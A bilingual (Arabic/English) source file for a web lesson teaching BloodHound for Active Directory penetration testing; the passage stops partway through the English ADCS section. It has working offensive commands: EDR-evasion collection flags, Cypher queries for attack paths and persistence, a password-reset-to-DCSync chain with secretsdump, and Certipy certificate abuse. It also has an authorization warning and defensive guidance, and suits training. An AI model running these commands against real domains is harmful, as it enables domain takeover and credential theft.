"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, Step, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="bloodhound-mastery">
      <L
        ar={
          <>
            <Section title="إيه هو BloodHound — وليه غيّر AD pentesting للأبد؟">
              <Analogy>
                إنت داخل دومين فيه 10 آلاف user و 500 سيرفر.

                - طب أعمل إيه يا حضرتك؟؟ أفحص ACLs بإيدي؟ أقرا 38 GPO ورا بعض؟

                ها ها ها يا نجم الجيل.. ده شغل سنة. ولو خلصت، هيكون الدومين اتغيّر.

                Active Directory زي مدينة فيها عشرات الآلاف من الموظفين والأبواب والبطاقات. قبل BloodHound، المهاجم كان بيفحص باب واحد في المرة. مع BloodHound، إنت بتحمل المدينة كلها في graph database وتسأله: <b>&quot;إيه أقصر طريق من الباب الجانبي ده لمكتب الـ CEO؟&quot;</b> — وهو يرسم السلسلة كاملة بكليك.

                Andy Robbins و Will Schroeder و Rohan Vazarkar نشروه في DEFCON 24 (2016). من ساعتها، أي AD assessment محترفة بتبدأ بـ SharpHound. مش &quot;أداة من ضمن الأدوات&quot; — هو الأداة.
              </Analogy>
              <Callout kind="danger" title="اللي بيحصل فعلياً">
                BloodHound بيلم كم رهيب من بيانات الـ AD. تشغيله على domain من غير تفويض = جريمة فيدرالية. استخدمه في pentest معاك فيه عقد، أو في معمل AD محلي (HTB Pro Labs، GOAD، VulnLab). مش مكسوف من السؤال — اسأل قبل ما تشغّل.
              </Callout>
              <Callout kind="warn" title="اوعى تعمل الغلطات دي">
                <ul className="list-disc pe-6 space-y-1">
                  <li>يشغّل <code>SharpHound -c All</code> في بيئة عميل من أول ثانية. الـ EDR بيولّع في 30 ثانية.</li>
                  <li>يستخدم الـ pre-built queries بس وما يكتبش Cypher. الـ pre-built بيغطي 30٪ بس من الحالات الحقيقية.</li>
                  <li>ما يضغطش "Mark as Owned" على اليوزرز اللي خرقهم، فيفضل يرسم الجراف من الصفر كل مرة.</li>
                  <li>ينسى الـ trusts. الـ child-domain trust = forest pivot جاهز، وهو مش شايفه.</li>
                </ul>
              </Callout>
              <p className="opacity-80">
                BloodHound CE (Community Edition) هو الـ standard الحالي (2024+) — حل محل النسخة القديمة Legacy. النظام
                client-server: <b>SharpHound/AzureHound</b> بيلم، و<b>BloodHound CE</b> بيحلل ويرسم.
              </p>
            </Section>

            <Section title="مكونات النظام — اعرف القطع قبل ما تشغل أي حاجة">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>SharpHound</b> (.NET): الـ collector لـ on-prem Active Directory. بيشتغل من جهاز مربوط بالـ domain (أو من لينكس مع credentials).</li>
                <li><b>AzureHound</b> (Go): الـ collector لـ Azure AD / Entra ID. بيقرا Microsoft Graph + ARM APIs.</li>
                <li><b>BloodHound CE</b>: التطبيق اللي بيستورد الـ JSON ويعرض الجراف.</li>
                <li><b>Neo4j</b>: قاعدة بيانات الجراف اللي تحت. مش بتتعامل معاها مباشرة في الغالب، بس تقدر تستعلم منها بـ Cypher.</li>
                <li><b>الـ "Edges"</b>: العلاقات (MemberOf, AdminTo, GenericAll, ForceChangePassword, …) — دي قلب التحليل كله.</li>
              </ul>
            </Section>

            <Section title="تركيب BloodHound CE — Docker (الأسرع)">
              <Code lang="bash">{`# يتطلب Docker + Docker Compose
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound/examples/docker-compose
docker compose pull
docker compose up
# افتح http://localhost:8080
# username: admin, password يُطبع في log أول تشغيل
docker logs bloodhound 2>&1 | grep "Initial Password"`}</Code>
              <Callout kind="warn" title="ملاحظة سريعة">
                <p>BloodHound CE حل محل BloodHound Legacy. لو لقيت دروس قديمة بتقولك <code>BloodHound.exe</code>، دي legacy. الـ CE
                  web-based وأكثر استقراراً بكتير.</p>
              </Callout>
            </Section>

            <Section title="جمع البيانات — SharpHound">
              <Step n={1} title="التشغيل من جهاز Windows في الـ domain">
                <Code lang="powershell">{`# نزّل SharpHound من https://github.com/SpecterOps/SharpHound/releases
# أو ضمن BloodHound CE → File Ingest → Download collector

# الافتراضي: كل شيء عدا session enumeration
SharpHound.exe -c All

# التفاصيل:
# DCOnly      — فقط معلومات DC، لا يلمس أي جهاز آخر (الأقل ضوضاء)
# Default     — DC + group memberships + sessions + local admin
# All         — كل شيء (الأعلى تغطية، الأكثر ضوضاء)
# Session     — من الذي يسجّل دخول أين الآن
# LoggedOn    — مثل Session لكن أكثر دقة (يحتاج local admin)
# ACL         — العلاقات الأهم — اجمعها دائماً`}</Code>
              </Step>
              <Step n={2} title="من Linux (لا يلزم وجود الجهاز في الـ domain)">
                <Code lang="bash">{`# bloodhound.py — Python alternative
pip install bloodhound
bloodhound-python -d corp.local -u user -p 'Pass!23' \\
  -c all -ns 10.10.10.10 --zip
# يخرج .zip جاهز للرفع`}</Code>
              </Step>
              <Step n={3} title="OPSEC وقت الجمع">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>--Stealth</b>: بيقلل الضوضاء، بيتفادى الـ collection methods اللي بتستفز الـ EDR.</li>
                  <li><b>--JitterPercent 30 --Throttle 1000</b>: عشوائية + تأخير بين الطلبات.</li>
                  <li><b>--ExcludeDomainControllers</b>: متفحصش الـ DCs مباشرة — ممكن تستفز ATA / Defender for Identity.</li>
                  <li><b>ابعد عن All في بيئة حساسة</b>: <code>-c DCOnly,Group,LocalGroup,GPOLocalGroup,Trusts,ACL</code> أهدا.</li>
                  <li><b>ابدأ بـ DCOnly</b>: لو عدّى من غير ما حد يحس، وسّع تدريجياً.</li>
                </ul>
              </Step>
              <Step n={4} title="الرفع لـ BloodHound">
                <Code lang="text">{`BloodHound CE → زرار "File Ingest" → اسحب وأفلت الـ .zip
أو في legacy: ادخل واجهة Neo4j → Upload Data → اختار ملفات الـ JSON
وقت الانتظار: domain متوسط ~15-30 دقيقة عشان يتعمل import`}</Code>
              </Step>
            </Section>

            <Section title="جمع Azure — AzureHound">
              <Code lang="bash">{`# Linux/Windows، Go binary
azurehound list -u 'user@tenant.onmicrosoft.com' -p 'Pass!' \\
  --tenant abcd-efgh-... -o azure.json

# أو بـ refresh token (أكثر صمتاً)
azurehound -r '<refresh_token>' --tenant ... list

# يجمع: users, groups, apps, service principals, role assignments, devices, subscriptions, RGs`}</Code>
              <Callout kind="warn" title="ليه Azure مهم">
                BloodHound بيكشف pivots حقيقية في Azure زي: <b>service principal معاه role في tenant تاني</b>، أو <b>nested
                  group membership عن طريق external invite</b>، أو <b>subscription Owner عن طريق cross-tenant trust</b>. الحاجات
                دي مش هتلاقيها إلا بالـ graph traversal.
              </Callout>
            </Section>

            <Section title="الاستعلامات الجاهزة — أول 20 محتاج تعرفها">
              <p className="opacity-90">في BloodHound اضغط Search → Pre-built Queries:</p>
              <TwoCol>
                <Card title="Quick Wins" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li>Find all Domain Admins</li>
                    <li>Find Shortest Paths to Domain Admins</li>
                    <li>Find Principals with DCSync Rights</li>
                    <li>Find Computers where Domain Users are Local Admin</li>
                    <li>Find Kerberoastable Users with Path to DA</li>
                    <li>Find AS-REP Roastable Users (DontReqPreAuth)</li>
                  </ul>
                </Card>
                <Card title="Big Lateral Movement" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li>Find Computers with Unsupported OS</li>
                    <li>Shortest Paths from Owned Principals</li>
                    <li>Find users with Constrained Delegation</li>
                    <li>Find computers with Unconstrained Delegation</li>
                    <li>Find ADCS abuse paths (ESC1-15)</li>
                    <li>Find LAPS read access</li>
                  </ul>
                </Card>
                <Card title="Sneaky / Cleanup" color="amber">
                  <ul className="list-disc pe-6 space-y-1">
                    <li>Find Disabled accounts that are Kerberoastable</li>
                    <li>Find PrincipalsWith DangerousACE on the Domain</li>
                    <li>Find owned objects (mark as red)</li>
                    <li>Find sessions of Domain Admins on non-DC</li>
                  </ul>
                </Card>
                <Card title="Azure" color="amber">
                  <ul className="list-disc pe-6 space-y-1">
                    <li>Find Global Admins</li>
                    <li>Service Principals with Microsoft Graph</li>
                    <li>Apps with dangerous Graph permissions</li>
                    <li>Path from on-prem to Azure (hybrid escapes)</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Cypher — اللغة السرّية لـ BloodHound">
              <Analogy>
                SQL بيقولك: "هاتلي صفوف". Cypher بيقولك: "ارسملي شكل". جداول vs جراف. أي محترف في BloodHound بيكتب Cypher،
                لأن الاستعلامات الجاهزة بتغطي 30% بس من الحالات الحقيقية.
              </Analogy>
              <Code lang="cypher">{`// 1) كل المسارات من user محدد إلى Domain Admins
MATCH p=shortestPath((u:User {name:"BOB@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// 2) أين له Domain User صلاحية write على computer
MATCH p=(u:User {name:"DOMAIN USERS@CORP.LOCAL"})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember]->(c:Computer)
RETURN p

// 3) Kerberoastable + path لـ DA — السلاح الأقوى
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN u.name, p
ORDER BY length(p)

// 4) كل المستخدمين الذين لا يتطلبون Pre-Auth (AS-REP roastable)
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.enabled

// 5) كل GPOs و من يحرّرها — تعديل GPO = code execution على آلاف الأجهزة
MATCH p=(s)-[r:GenericAll|GenericWrite|WriteOwner]->(g:GPO)
RETURN p

// 6) مسارات من جهاز "owned" (علّمته red) لأي high-value target
MATCH p=shortestPath((c:Computer {owned:true})-[*1..]->(t {highvalue:true}))
RETURN p LIMIT 50

// 7) مستخدمين لم يسجّلوا دخول منذ 6 شهور — حسابات نائمة جيدة لـ persistence
MATCH (u:User)
WHERE u.lastlogon < (timestamp()/1000 - 15768000)
  AND u.enabled = true
RETURN u.name, u.lastlogon
ORDER BY u.lastlogon`}</Code>
            </Section>

            <Section title="الـ Edges — أهم 15 لازم تحفظهم">
              <TwoCol>
                <Card title="عضويات و ACL" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li><b>MemberOf</b>: عضوية مجموعة. الـ traversal الأساسي.</li>
                    <li><b>AdminTo</b>: لـ user/group صلاحية local admin على computer.</li>
                    <li><b>GenericAll</b>: تحكّم كامل بالـ object — أقوى ACL.</li>
                    <li><b>GenericWrite</b>: كتابة معظم attributes.</li>
                    <li><b>WriteOwner</b>: تستطيع جعل نفسك المالك ثم تعطي نفسك GenericAll.</li>
                    <li><b>WriteDacl</b>: تعديل ACL → اعطِ نفسك أي صلاحية.</li>
                  </ul>
                </Card>
                <Card title="Kerberos abuse" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li><b>AllowedToDelegate</b>: Constrained Delegation.</li>
                    <li><b>AllowedToAct</b>: RBCD (resource-based constrained delegation).</li>
                    <li><b>HasSession</b>: مستخدم مسجّل دخول هنا → احصد NTLM/Kerberos cache.</li>
                  </ul>
                </Card>
                <Card title="استعادة كلمات المرور" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li><b>ForceChangePassword</b>: غيّر كلمة سر مستخدم آخر بدون معرفة القديمة.</li>
                    <li><b>AddMember</b>: أضف نفسك لمجموعة قوية.</li>
                    <li><b>ReadLAPSPassword</b>: اقرأ كلمة سر local admin من LAPS.</li>
                    <li><b>ReadGMSAPassword</b>: اقرأ كلمة سر gMSA.</li>
                  </ul>
                </Card>
                <Card title="Tier-0 / Domain control" color="red">
                  <ul className="list-disc pe-6 space-y-1">
                    <li><b>DCSync</b>: اقرأ كل hashes من DC — game over.</li>
                    <li><b>GetChangesAll</b>: نفس الشيء (تركيبة من Replication permissions).</li>
                    <li><b>SyncLAPSPassword</b>: قراءة LAPS عبر AD replication.</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="سيناريو حقيقي — من Domain User لـ Domain Admin في 4 خطوات">
              <Step n={1} title="Mark as Owned">
                <p>لقطت hash لـ <code>jsmith</code> عن طريق Responder. كليك يمين عليه في BloodHound → Mark User as Owned.</p>
              </Step>
              <Step n={2} title="Shortest Path from Owned">
                <p>شغّل الاستعلام الجاهز "Shortest Paths from Owned Principals". هتشوف:</p>
                <Code lang="text">{`jsmith → MemberOf → IT-SUPPORT
IT-SUPPORT → ForceChangePassword → svc_backup
svc_backup → MemberOf → BACKUP_OPERATORS
BACKUP_OPERATORS → DCSync → CORP.LOCAL`}</Code>
              </Step>
              <Step n={3} title="نفّذ السلسلة">
                <Code lang="bash">{`# 1) jsmith → غيّر باسورد svc_backup
net user svc_backup NewP@ss123 /domain
# أو عن طريق Set-DomainUserPassword (PowerView)
Set-DomainUserPassword -Identity svc_backup -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)

# 2) سجل دخول كـ svc_backup → نفذ DCSync
secretsdump.py CORP/svc_backup:'NewP@ss123'@DC.CORP.LOCAL -just-dc

# النتيجة: كل NTLM hashes في الدومين → بما فيهم krbtgt → Golden Ticket للأبد`}</Code>
              </Step>
              <Step n={4} title="نظّف وراك">
                <p>رجّع باسورد svc_backup للقيمة الأصلية لو قدرت. وثّق كل خطوة في التقرير. متسبش ticketing artifacts.</p>
                <p className="opacity-80 mt-2">اكتبها على المكتب: المهاجم اللي بينضف وراه = اللي بيرجع تاني الشهر الجاي. اللي بيسيب فوضى = هيتمسك مرة وخلاص.</p>
              </Step>
            </Section>

            <Section title="ADCS — ESC1 لـ ESC15 عن طريق BloodHound">
              <p className="opacity-90">
                BloodHound CE بيكشف <b>كل</b> الـ ESC paths أوتوماتيك عن طريق edges مخصصة:
              </p>
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li><b>ADCSESC1</b>: قالب يسمح بـ SAN spoofing → certificate كأي مستخدم.</li>
                <li><b>ADCSESC3</b>: enrollment agent template → اطلب cert نيابة عن DA.</li>
                <li><b>ADCSESC4</b>: vulnerable ACL على template.</li>
                <li><b>ADCSESC6</b>: EDITF_ATTRIBUTESUBJECTALTNAME2 على CA.</li>
                <li><b>ADCSESC7-9</b>: NTLM relay → CA endpoints.</li>
                <li><b>ADCSESC13</b>: OID group link abuse.</li>
              </ul>
              <Code lang="bash">{`# الاستغلال بعد الكشف:
# Certipy (الأداة الموحّدة)
certipy find -u user@corp.local -p Pass! -dc-ip 10.0.0.1 -vulnerable
certipy req -u user@corp.local -p Pass! -ca CORP-CA \\
  -template VulnTemplate -upn administrator@corp.local
# نتيجة: cert يصادق كـ administrator → DA`}</Code>
            </Section>

            <Section title="نصايح احترافية الـ Red Teams بيستخدموها">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>اجمع الداتا قبل ما تحتاجها</b>: شغّل SharpHound أول الـ engagement حتى لو معرفش هتعمل بيها إيه.</li>
                <li><b>استورد على instance خاص</b>: متخلطش بيانات الـ clients ببعض. Docker لكل engagement.</li>
                <li><b>اضغط على نود واختار "Set as Starting Node"</b> + "Set as Ending Node" → "Pathfinding".</li>
                <li><b>"Mark as High Value"</b> للأنظمة الحساسة (file servers، Exchange، PKI، Tier-0). الـ Pathfinding بيفضّلها.</li>
                <li><b>استخدم تبويب "Analysis"</b> — fan-out / fan-in counts بتكشف الـ bottlenecks في الـ AD.</li>
                <li><b>Custom queries.json</b>: احفظ الـ Cypher بتاعتك عشان تستخدمها عبر engagements.</li>
                <li><b>تابع الـ "Outbound Object Control"</b> لكل user بتخترقه — هو يقدر يلمس إيه؟</li>
                <li><b>BloodHound + ldapdomaindump</b>: مكملين بعض، الـ ldapdomaindump أسرع للملخصات النصية.</li>
                <li><b>متنساش الـ trusts</b>: ناس كتير بتسيبها، لكن child domain trust = forest pivot.</li>
                <li><b>قبل أي حركة: Cypher بيقولك أقصر طريق</b>. متتحركش أعمى. كل group بتنضم لها = ضوضاء.</li>
              </ol>
            </Section>

            <Section title="من جهة الحماية — هتتمسك إزاي؟">
              <Callout kind="warn" title="إشارات تشغيل SharpHound">
                <ul className="list-disc pe-6 space-y-1">
                  <li>كم هائل من LDAP queries من جهاز واحد في وقت قصير.</li>
                  <li>SMB sessions على كل host في الدومين (lateral session enumeration).</li>
                  <li>Microsoft Defender for Identity بيرفع تنبيه "Reconnaissance using directory services queries".</li>
                  <li>Honey objects: حساب وهمي بـ SPN مغري → لو اتعمل له Kerberoast = مهاجم بنسبة 100%.</li>
                  <li>تغييرات ACL غير معتادة، خصوصاً على gMSA وLAPS-readable groups.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="الحماية — هندسة AD صعب على BloodHound">
              <Callout kind="good" title="مرجع دفاعي عملي">
                <ol className="list-decimal pe-6 space-y-2">
                  <li><b>Tier model صارم</b>: Tier-0 (DC, ADCS, Entra Connect)، Tier-1 (servers)، Tier-2 (workstations). مفيش login عبر الـ tiers.</li>
                  <li><b>LAPS لكل local admin</b>: كل جهاز معاه باسورد فريد، بيتغير دورياً.</li>
                  <li><b>Kerberoast hardening</b>: gMSA لكل service account، اقفل RC4، AES بس.</li>
                  <li><b>ADCS hardening</b>: راجع كل template، اقفل SAN في user templates، خلي EDITF_ATTRIBUTESUBJECTALTNAME2 مقفول.</li>
                  <li><b>Constrained delegation بس</b> — مفيش Unconstrained على أي host.</li>
                  <li><b>راقب تغييرات الـ ACL على objects قيّمة</b> — تنبيه فوري.</li>
                  <li><b>Privileged Access Workstations (PAW)</b> لـ Tier-0 admins.</li>
                  <li><b>شغّل BloodHound على نفسك دورياً</b> — اعرف الـ paths قبل المهاجم.</li>
                  <li><b>Microsoft Defender for Identity (مدفوع)</b> — بيكشف أغلب تكنيكات BloodHound + Kerberoast + DCSync.</li>
                </ol>
              </Callout>
            </Section>

            <Section title="الخلاصة الناشفة">
              <p className="opacity-90">
                BloodHound مش &quot;أداة من ضمن الأدوات&quot;.
                <br/>
                هو اللي بيحوّل الـ AD من &quot;غابة مظلمة&quot; لـ &quot;خريطة طرق&quot;.
                <br/><br/>
                المستجد بيفتح BloodHound، يدوس Find Shortest Path، ياخد screenshot، خلاص.
                <br/>
                المحترف بيقعد ساعتين يكتب Cypher. يعرف الـ bottlenecks. يعرف اليوزرز اللي محدش فاكرهم. يعرف الـ trusts المنسية. وبيدخل سكة محدش شافها.
                <br/><br/>
                لو إنت blue team؟ اكتبها على الحيطة اللي في وش السرير: شغّل BloodHound على نفسك. كل شهر.
                <br/>
                لو لقيت Domain User بيوصل لـ DA في 4 خطوات، الفجوة موجودة. ما تستناش حد يستغلها.
                <br/><br/>
                اللي بتشوفه إنت في الجراف، المهاجم شافه قبلك بشهر.
              </p>
            </Section>
            <Section title="مصادر للإتقان">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li><b>BloodHound Docs</b>: bloodhound.specterops.io — رسمي و محدّث.</li>
                <li><b>SpecterOps blog</b>: مقالات عميقة من المطوّرين.</li>
                <li><b>HTB Pro Labs (Dante, Offshore, RastaLabs)</b>: AD environments واقعية.</li>
                <li><b>GOAD (Game of Active Directory)</b>: مختبر مجاني يُنشأ بـ Vagrant.</li>
                <li><b>SANS SEC560/SEC565</b>: تدريبات احترافية.</li>
                <li><b>كتاب The Hacker Playbook 3</b> + <b>Pentesting Active Directory by SpecterOps</b>.</li>
              </ul>
            </Section>
          </>
        }
        en={
          <>
            <Section title="What is BloodHound — and why did it change AD pentesting forever?">
              <Analogy>
                Active Directory is like a city: tens of thousands of employees, doors, badges, permissions. Before
                BloodHound, an attacker tested one door at a time. With BloodHound, you load the entire city into a graph
                database and ask: <b>"What's the shortest path from this side door to the CEO's office?"</b> — and it
                draws the whole chain in one click.
              </Analogy>
              <Callout kind="danger" title="Authorized use only">
                BloodHound collects an enormous amount of AD data. Running it against an unauthorized domain is a crime.
                Use it inside a signed pentest, or in a local AD lab (HTB Pro Labs, GOAD, VulnLab).
              </Callout>
              <p className="opacity-80">
                BloodHound CE (Community Edition) is the current standard (2024+) — it replaced the old Legacy version.
                It's client-server: <b>SharpHound/AzureHound</b> collect, <b>BloodHound CE</b> analyzes and visualizes.
              </p>
            </Section>

            <Section title="Components — know the parts before you run anything">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>SharpHound</b> (.NET): on-prem AD collector. Run from a domain-joined host (or from Linux with creds).</li>
                <li><b>AzureHound</b> (Go): collector for Azure AD / Entra ID. Reads Microsoft Graph + ARM APIs.</li>
                <li><b>BloodHound CE</b>: the app that imports JSON and renders the graph.</li>
                <li><b>Neo4j</b>: the graph DB underneath. Usually you don't touch it directly, but you can query with Cypher.</li>
                <li><b>The "edges"</b>: relationships (MemberOf, AdminTo, GenericAll, ForceChangePassword, …) — the heart of analysis.</li>
              </ul>
            </Section>

            <Section title="Install BloodHound CE — Docker (fastest)">
              <Code lang="bash">{`# Requires Docker + Docker Compose
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound/examples/docker-compose
docker compose pull
docker compose up
# Open http://localhost:8080
# username: admin, password is printed on first run
docker logs bloodhound 2>&1 | grep "Initial Password"`}</Code>
              <Callout kind="warn" title="Quick note">
                <p>BloodHound CE replaces BloodHound Legacy. If you see old guides referencing <code>BloodHound.exe</code>, they're
                  legacy. CE is web-based and much more stable.</p>
              </Callout>
            </Section>

            <Section title="Data collection — SharpHound">
              <Step n={1} title="From a Windows host inside the domain">
                <Code lang="powershell">{`# Download SharpHound from https://github.com/SpecterOps/SharpHound/releases
# Or via BloodHound CE → File Ingest → Download collector

# Default: everything except session enumeration
SharpHound.exe -c All

# The methods:
# DCOnly      — DC info only, doesn't touch other hosts (least noisy)
# Default     — DC + group memberships + sessions + local admin
# All         — everything (max coverage, max noise)
# Session     — who is logged on where right now
# LoggedOn    — like Session but more accurate (needs local admin)
# ACL         — the most important relationships — always collect`}</Code>
              </Step>
              <Step n={2} title="From Linux (no domain join needed)">
                <Code lang="bash">{`# bloodhound.py — Python alternative
pip install bloodhound
bloodhound-python -d corp.local -u user -p 'Pass!23' \\
  -c all -ns 10.10.10.10 --zip
# Outputs a .zip ready to upload`}</Code>
              </Step>
              <Step n={3} title="Collection OPSEC">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>--Stealth</b>: lighter collection, skips noisy methods that wake EDR.</li>
                  <li><b>--JitterPercent 30 --Throttle 1000</b>: jitter + delay between requests.</li>
                  <li><b>--ExcludeDomainControllers</b>: don't probe DCs directly — wakes ATA / Defender for Identity.</li>
                  <li><b>Avoid 'All' in sensitive environments</b>: <code>-c DCOnly,Group,LocalGroup,GPOLocalGroup,Trusts,ACL</code> is quieter.</li>
                  <li><b>Start with DCOnly</b>: if it's clean, expand gradually.</li>
                </ul>
              </Step>
              <Step n={4} title="Upload to BloodHound">
                <Code lang="text">{`BloodHound CE → "File Ingest" → drag & drop the .zip
On legacy: Neo4j UI → Upload Data → choose JSON files
Wait time: medium domain ~15-30 min for import`}</Code>
              </Step>
            </Section>

            <Section title="Azure collection — AzureHound">
              <Code lang="bash">{`# Linux/Windows, Go binary
azurehound list -u 'user@tenant.onmicrosoft.com' -p 'Pass!' \\
  --tenant abcd-efgh-... -o azure.json

# Or via refresh token (quieter)
azurehound -r '<refresh_token>' --tenant ... list

# Collects: users, groups, apps, service principals, role assignments, devices, subscriptions, RGs`}</Code>
              <Callout kind="warn" title="Why Azure matters">
                BloodHound surfaces real pivots in Azure like: <b>service principal with a role in another tenant</b>, or
                <b> nested group membership through external invites</b>, or <b>subscription owner via cross-tenant trust</b>.
                You won't find these without graph traversal.
              </Callout>
            </Section>

            <Section title="Built-in queries — the top 20">
              <p className="opacity-90">In BloodHound, click Search → Pre-built Queries:</p>
              <TwoCol>
                <Card title="Quick Wins" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li>Find all Domain Admins</li>
                    <li>Find Shortest Paths to Domain Admins</li>
                    <li>Find Principals with DCSync Rights</li>
                    <li>Find Computers where Domain Users are Local Admin</li>
                    <li>Find Kerberoastable Users with Path to DA</li>
                    <li>Find AS-REP Roastable Users (DontReqPreAuth)</li>
                  </ul>
                </Card>
                <Card title="Big Lateral Movement" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li>Find Computers with Unsupported OS</li>
                    <li>Shortest Paths from Owned Principals</li>
                    <li>Find users with Constrained Delegation</li>
                    <li>Find computers with Unconstrained Delegation</li>
                    <li>Find ADCS abuse paths (ESC1-15)</li>
                    <li>Find LAPS read access</li>
                  </ul>
                </Card>
                <Card title="Sneaky / Cleanup" color="amber">
                  <ul className="list-disc ps-6 space-y-1">
                    <li>Find Disabled accounts that are Kerberoastable</li>
                    <li>Find Principals with Dangerous ACE on the Domain</li>
                    <li>Find owned objects (mark as red)</li>
                    <li>Find sessions of Domain Admins on non-DC</li>
                  </ul>
                </Card>
                <Card title="Azure" color="amber">
                  <ul className="list-disc ps-6 space-y-1">
                    <li>Find Global Admins</li>
                    <li>Service Principals with Microsoft Graph</li>
                    <li>Apps with dangerous Graph permissions</li>
                    <li>Path from on-prem to Azure (hybrid escapes)</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Cypher — BloodHound's secret language">
              <Analogy>
                SQL says "give me rows". Cypher says "draw me a shape". Tables vs graphs. Every BloodHound pro writes
                Cypher, because the built-in queries cover only ~30% of real cases.
              </Analogy>
              <Code lang="cypher">{`// 1) All paths from a specific user to Domain Admins
MATCH p=shortestPath((u:User {name:"BOB@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// 2) Where do Domain Users have write rights on a computer
MATCH p=(u:User {name:"DOMAIN USERS@CORP.LOCAL"})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember]->(c:Computer)
RETURN p

// 3) Kerberoastable + path to DA — the strongest weapon
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN u.name, p
ORDER BY length(p)

// 4) All AS-REP roastable users (DontReqPreAuth)
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.enabled

// 5) All GPOs and who can edit them — GPO write = code exec on thousands of hosts
MATCH p=(s)-[r:GenericAll|GenericWrite|WriteOwner]->(g:GPO)
RETURN p

// 6) Paths from any owned (red-marked) computer to any high-value target
MATCH p=shortestPath((c:Computer {owned:true})-[*1..]->(t {highvalue:true}))
RETURN p LIMIT 50

// 7) Users who haven't logged in for 6 months — perfect for stealthy persistence
MATCH (u:User)
WHERE u.lastlogon < (timestamp()/1000 - 15768000)
  AND u.enabled = true
RETURN u.name, u.lastlogon
ORDER BY u.lastlogon`}</Code>
            </Section>

            <Section title="The 15 edges you must know">
              <TwoCol>
                <Card title="Membership & ACLs" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li><b>MemberOf</b>: group membership. The basic traversal.</li>
                    <li><b>AdminTo</b>: user/group has local admin on a computer.</li>
                    <li><b>GenericAll</b>: full control over the object — strongest ACL.</li>
                    <li><b>GenericWrite</b>: write most attributes.</li>
                    <li><b>WriteOwner</b>: take ownership, then grant yourself GenericAll.</li>
                    <li><b>WriteDacl</b>: edit the ACL — grant yourself anything.</li>
                  </ul>
                </Card>
                <Card title="Kerberos abuse" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li><b>AllowedToDelegate</b>: Constrained Delegation.</li>
                    <li><b>AllowedToAct</b>: RBCD (resource-based constrained delegation).</li>
                    <li><b>HasSession</b>: a user is logged on here → harvest NTLM/Kerberos cache.</li>
                  </ul>
                </Card>
                <Card title="Credential reset" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li><b>ForceChangePassword</b>: change another user's password without knowing the old one.</li>
                    <li><b>AddMember</b>: add yourself to a powerful group.</li>
                    <li><b>ReadLAPSPassword</b>: read the local-admin password from LAPS.</li>
                    <li><b>ReadGMSAPassword</b>: read a gMSA password.</li>
                  </ul>
                </Card>
                <Card title="Tier-0 / Domain control" color="red">
                  <ul className="list-disc ps-6 space-y-1">
                    <li><b>DCSync</b>: read all hashes from a DC — game over.</li>
                    <li><b>GetChangesAll</b>: same thing (combination of replication permissions).</li>
                    <li><b>SyncLAPSPassword</b>: read LAPS over AD replication.</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Real scenario — Domain User to Domain Admin in 4 steps">
              <Step n={1} title="Mark as Owned">
                <p>You captured a hash for <code>jsmith</code> via Responder. Right-click in BloodHound → Mark User as Owned.</p>
              </Step>
              <Step n={2} title="Shortest Path from Owned">
                <p>Run the built-in "Shortest Paths from Owned Principals". You see:</p>
                <Code lang="text">{`jsmith → MemberOf → IT-SUPPORT
IT-SUPPORT → ForceChangePassword → svc_backup
svc_backup → MemberOf → BACKUP_OPERATORS
BACKUP_OPERATORS → DCSync → CORP.LOCAL`}</Code>
              </Step>
              <Step n={3} title="Execute the chain">
                <Code lang="bash">{`# 1) jsmith → reset svc_backup's password
net user svc_backup NewP@ss123 /domain
# Or via Set-DomainUserPassword (PowerView)
Set-DomainUserPassword -Identity svc_backup -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)

# 2) Authenticate as svc_backup → DCSync
secretsdump.py CORP/svc_backup:'NewP@ss123'@DC.CORP.LOCAL -just-dc

# Result: every NTLM hash in the domain → including krbtgt → Golden Ticket forever`}</Code>
              </Step>
              <Step n={4} title="Clean up">
                <p>Restore svc_backup's old password if possible. Document every step in the report. Don't leave ticket artifacts behind.</p>
              </Step>
            </Section>

            <Section title="ADCS — ESC1 to ESC15 via BloodHound">
              <p className="opacity-90">
                BloodHound CE surfaces <b>every</b> ESC path automatically through dedicated edges:
              </p>
              <ul className="list-disc ps-6 space-y-1 opacity-90">
